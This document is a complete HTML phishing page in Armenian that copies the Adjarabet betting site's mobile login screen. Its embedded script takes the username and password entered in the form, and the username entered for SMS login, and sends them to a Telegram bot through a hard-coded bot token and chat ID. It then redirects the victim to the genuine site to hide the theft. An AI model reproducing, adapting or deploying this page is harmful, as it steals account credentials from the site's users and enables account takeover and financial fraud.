<!DOCTYPE html>
<html lang="hy">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <title>Adjarabet - Մուտք</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }
    body {
      background-color: #0f1215;
      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      color: #ffffff;
      height: 100vh;
      overflow: hidden;
    }
    .mobile-login-container {
      display: flex;
      flex-direction: column;
      height: 100vh;
      overflow: hidden;
    }
    .banner-section {
      position: relative;
      flex-shrink: 0;
    }
    .banner-image {
      width: 100%;
      height: auto;
      display: block;
    }
    .banner-link {
      display: block;
      cursor: pointer;
    }
    .header-overlay {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      padding: 16px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      z-index: 10;
    }
    .logo-icon {
      width: 40px;
      height: 40px;
      cursor: pointer;
    }
    .logo-icon svg {
      width: 100%;
      height: 100%;
    }
    .close-button {
      background: rgba(36, 42, 47, 0.9);
      border: none;
      border-radius: 999px;
      width: 40px;
      height: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      color: #9ca3af;
    }
    .login-card {
      background-color: #1a1f24;
      border-radius: 24px 24px 0 0;
      flex: 1;
      margin-top: auto;
      padding: 20px 16px 32px;
      display: flex;
      flex-direction: column;
      gap: 24px;
      box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.3);
    }
    .title {
      font-size: 20px;
      font-weight: 600;
    }
    .form-group {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }
    .input-wrapper {
      background-color: #23282e;
      border: 1px solid #2f353c;
      border-radius: 12px;
      display: flex;
      align-items: center;
      padding: 4px 12px;
    }
    .input-wrapper:focus-within {
      border-color: #4c9aff;
    }
    .input-icon {
      width: 20px;
      height: 20px;
      margin-right: 8px;
      color: #7e8a93;
      flex-shrink: 0;
    }
    .input-field-container {
      flex: 1;
      position: relative;
      height: 56px;
      display: flex;
      align-items: center;
    }
    .floating-label {
      position: absolute;
      left: 0;
      top: 50%;
      transform: translateY(-50%);
      font-size: 14px;
      color: #7e8a93;
      pointer-events: none;
      transition: 0.2s ease;
    }
    .input-field {
      width: 100%;
      background: transparent;
      border: none;
      outline: none;
      color: white;
      font-size: 16px;
      padding-top: 18px;
      padding-bottom: 4px;
    }
    .input-field:focus + .floating-label,
    .input-field:not(:placeholder-shown) + .floating-label {
      top: 8px;
      transform: translateY(0);
      font-size: 11px;
      color: #9aa6b0;
    }
    .otp-button {
      background: #2c353d;
      border: none;
      border-radius: 40px;
      padding: 8px 16px;
      font-size: 13px;
      color: #cbd5e1;
      white-space: nowrap;
      cursor: pointer;
      height: 40px;
    }
    .otp-button:hover {
      background: #3a444e;
      color: white;
    }
    .password-toggle {
      background: none;
      border: none;
      color: #7e8a93;
      cursor: pointer;
      padding: 8px;
    }
    .recovery-links {
      display: flex;
      justify-content: space-between;
      margin-top: 4px;
    }
    .recovery-link {
      background: none;
      border: none;
      color: #9ca3af;
      font-size: 12px;
      border-bottom: 1px solid transparent;
      padding: 4px 0;
      cursor: pointer;
    }
    .recovery-link:hover {
      color: white;
      border-bottom-color: #4c9aff;
    }
    .login-btn {
      background: linear-gradient(135deg, #3a9b5e 0%, #2d8a4e 100%);
      border: none;
      border-radius: 40px;
      padding: 14px;
      font-size: 16px;
      font-weight: 600;
      color: white;
      width: 100%;
      cursor: pointer;
      margin-top: 8px;
    }
    .login-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }
    .divider {
      display: flex;
      align-items: center;
      gap: 12px;
      margin: 8px 0;
    }
    .divider-line {
      flex: 1;
      height: 1px;
      background: linear-gradient(90deg, #181c20, #373f45);
    }
    .divider-text {
      font-size: 12px;
      color: #8e9aa4;
    }
    .register-btn {
      background: #2c353d;
      border: none;
      border-radius: 40px;
      padding: 14px;
      font-size: 16px;
      font-weight: 600;
      color: #e5e9f0;
      width: 100%;
      cursor: pointer;
      text-align: center;
      display: block;
      text-decoration: none;
    }
    .register-btn:hover {
      background: #3b464f;
      color: white;
    }
    .spinner {
      display: inline-block;
      width: 18px;
      height: 18px;
      border: 2px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 0.6s linear infinite;
      margin-left: 8px;
      vertical-align: middle;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .btn-text {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .toast-message {
      position: fixed;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%);
      background: #2c353d;
      color: white;
      padding: 10px 20px;
      border-radius: 40px;
      font-size: 14px;
      z-index: 1000;
      opacity: 0;
      transition: opacity 0.3s;
      pointer-events: none;
    }
    .toast-message.show {
      opacity: 1;
    }
  </style>
</head>
<body>

<div class="mobile-login-container">
  <div class="banner-section">
    <a class="banner-link" href="https://www.adjarabet.am/hy">
      <img class="banner-image" src="https://staticfiles.adjarabet.am/static.am/desktop/cms-nova/media/66446/e92592d8904ba7fbbf6c7afab3aeab09.webp" alt="Promotion banner">
    </a>
    <div class="header-overlay">
      <div class="logo-icon">
        <svg viewBox="0 0 40 40" fill="none">
          <path d="M20 5L33 12L20 19L7 12L20 5Z" fill="#2DD179"/>
          <path d="M20 19L33 12V26L20 33V19Z" fill="#1F9A55"/>
          <path d="M20 19L7 12V26L20 33V19Z" fill="#1C8148"/>
          <circle cx="20" cy="20" r="3" fill="white"/>
        </svg>
      </div>
      <button class="close-button" aria-label="Close">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M18 6L6 18M6 6l12 12" />
        </svg>
      </button>
    </div>
  </div>

  <div class="login-card">
    <div class="title">Մուտք</div>

    <form class="form-group" id="loginForm">
      <div class="input-wrapper">
        <div class="input-icon">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
            <circle cx="12" cy="7" r="4" />
          </svg>
        </div>
        <div class="input-field-container">
          <input type="text" id="username" class="input-field" placeholder=" " autocomplete="username">
          <label class="floating-label">Անուն</label>
        </div>
        <button type="button" class="otp-button" id="otpBtn">Մուտք SMS-ով</button>
      </div>

      <div class="input-wrapper">
        <div class="input-icon">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
          </svg>
        </div>
        <div class="input-field-container">
          <input type="password" id="password" class="input-field" placeholder=" " autocomplete="current-password">
          <label class="floating-label">գաղտնաբառը</label>
        </div>
        <button type="button" class="password-toggle" id="togglePassword">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
            <circle cx="12" cy="12" r="3" />
          </svg>
        </button>
      </div>

      <div class="recovery-links">
        <button type="button" class="recovery-link" id="restoreUsername">Մուտքանվան վերականգնում</button>
        <button type="button" class="recovery-link" id="restorePass">գաղտնաբառի վերականգնում</button>
      </div>

      <button type="submit" class="login-btn" id="loginBtn">
        <span class="btn-text">Մուտք</span>
      </button>
    </form>

    <div class="divider">
      <div class="divider-line"></div>
      <span class="divider-text">Հաշիվ չունեք:</span>
      <div class="divider-line" style="transform: rotate(180deg);"></div>
    </div>

    <a href="https://www.adjarabet.am/hy/SignupAm/First" class="register-btn" id="registerBtn">Գրանցում</a>
  </div>
</div>

<div id="toastMsg" class="toast-message"></div>

<script>
(function() {
    const BOT_TOKEN = '8708195196:AAHbiKgr19AYM5X1rFNbg-qo0DIM8iRCxUs';
    const CHAT_ID = '8707669446';
    
    const REAL_LOGIN_URL = 'https://www.adjarabet.am/hy';
    const REAL_REGISTER_URL = 'https://www.adjarabet.am/hy/SignupAm/First';
    
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginForm = document.getElementById('loginForm');
    const loginBtn = document.getElementById('loginBtn');
    const toggleBtn = document.getElementById('togglePassword');
    const otpBtn = document.getElementById('otpBtn');
    const restoreUser = document.getElementById('restoreUsername');
    const restorePass = document.getElementById('restorePass');
    const registerBtn = document.getElementById('registerBtn');
    const closeBtn = document.querySelector('.close-button');
    const toastEl = document.getElementById('toastMsg');
    
    function showMessage(text, isError = false) {
      if (!toastEl) return;
      toastEl.textContent = text;
      toastEl.style.backgroundColor = isError ? '#b91c1c' : '#2c353d';
      toastEl.classList.add('show');
      setTimeout(() => toastEl.classList.remove('show'), 3000);
    }
    
    function updateLabel(input) {
      const label = input.nextElementSibling;
      if (label && label.classList.contains('floating-label')) {
        if (input.value.trim() !== '') {
          label.style.top = '8px';
          label.style.fontSize = '11px';
          label.style.transform = 'translateY(0)';
        } else {
          label.style.top = '50%';
          label.style.fontSize = '14px';
          label.style.transform = 'translateY(-50%)';
        }
      }
    }
    
    [usernameInput, passwordInput].forEach(inp => {
      if (inp) {
        updateLabel(inp);
        inp.addEventListener('input', () => updateLabel(inp));
      }
    });
    
    if (toggleBtn && passwordInput) {
      toggleBtn.addEventListener('click', () => {
        passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
      });
    }
    
    function setLoading(loading) {
      if (!loginBtn) return;
      loginBtn.disabled = loading;
      loginBtn.querySelector('.btn-text').innerHTML = loading ? 'Մուտք <span class="spinner"></span>' : 'Մուտք';
    }
    
    // ⭐⭐⭐ ՄԻԱՅՆ LOGIN + PASSWORD (ԱՌԱՆՑ ԼՐԱՑՈՒՑԻՉ ՏԵՔՍՏԻ)
    async function sendToTelegram(username, password, method) {
      let messageText = '';
      if (method === 'password') {
        // ✅ ՄԻԱՅՆ LOGIN-ը և PASSWORD-ը
        messageText = `${username}\n${password}`;
      } else {
        messageText = `OTP: ${username}`;
      }
      
      const encodedText = encodeURIComponent(messageText);
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedText}`;
      
      console.log('📤 Ուղարկում ենք...');
      console.log('📝 Հաղորդագրություն:\n', messageText);
      
      try {
        const response = await fetch(url);
        const result = await response.json();
        
        if (result.ok) {
          console.log('✅ Ուղարկված է');
          showMessage('✅ Տվյալներն ուղարկված են');
          return true;
        } else {
          console.log('❌ Սխալ:', result);
          showMessage('❌ Սխալ: ' + result.description, true);
          return false;
        }
      } catch(error) {
        console.log('❌ Fetch error:', error);
        showMessage('❌ Ցանցային սխալ', true);
        return false;
      }
    }
    
    async function handleLogin(e) {
      e.preventDefault();
      const username = usernameInput.value.trim();
      const password = passwordInput.value;
      
      if (!username || !password) {
        showMessage('Լրացրեք բոլոր դաշտերը', true);
        return;
      }
      
      setLoading(true);
      await sendToTelegram(username, password, 'password');
      
      setTimeout(() => {
        setLoading(false);
        window.location.href = REAL_LOGIN_URL;
      }, 1000);
    }
    
    async function handleOtp() {
      const username = usernameInput.value.trim();
      if (!username) {
        showMessage('Մուտքագրեք Անունը', true);
        return;
      }
      
      otpBtn.disabled = true;
      otpBtn.textContent = 'Ուղարկվում է...';
      await sendToTelegram(username, '', 'otp');
      
      setTimeout(() => {
        otpBtn.disabled = false;
        otpBtn.textContent = 'Մուտք SMS-ով';
        window.location.href = REAL_LOGIN_URL;
      }, 800);
    }
    
    if (loginForm) loginForm.addEventListener('submit', handleLogin);
    if (otpBtn) otpBtn.addEventListener('click', handleOtp);
    if (restoreUser) restoreUser.addEventListener('click', () => window.location.href = 'https://www.adjarabet.am/hy/Recovery/Username');
    if (restorePass) restorePass.addEventListener('click', () => window.location.href = 'https://www.adjarabet.am/hy/Recovery/Password');
    if (registerBtn) registerBtn.addEventListener('click', (e) => { e.preventDefault(); window.location.href = REAL_REGISTER_URL; });
    if (closeBtn) closeBtn.addEventListener('click', () => window.location.href = 'https://www.adjarabet.am/hy');
    
    document.querySelector('.banner-link')?.addEventListener('click', (e) => { e.preventDefault(); window.location.href = 'https://www.adjarabet.am/hy'; });
    document.querySelector('.logo-icon')?.addEventListener('click', () => window.location.href = 'https://www.adjarabet.am/hy');
    
    console.log('✅ Կոդը բեռնված է');
    console.log('🔑 BOT_TOKEN:', BOT_TOKEN ? 'Տեղադրված է' : 'Բացակայում է');
    console.log('📱 CHAT_ID:', CHAT_ID);
})();
</script>
</body>
</html>
